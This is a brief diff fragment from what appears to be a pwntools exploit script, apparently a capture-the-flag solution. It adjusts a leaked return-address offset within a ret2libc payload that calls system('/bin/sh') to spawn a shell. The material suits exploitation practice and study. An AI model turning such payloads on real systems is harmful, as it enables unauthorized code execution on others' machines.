@@ -38,7 +38,7 @@ system = libc.sym["system"]
 str_bin_sh = libc.search("/bin/sh").next()
 log.success(hex(libc.sym["system"]))
 # leak ret
-retOnStack = addr_i - 3 + 4*8
+retOnStack = leak(13) - 4
 
 payload = p32(system) + p32(0xdeadbeef) + p32(str_bin_sh)
 for i in range(len(payload)):
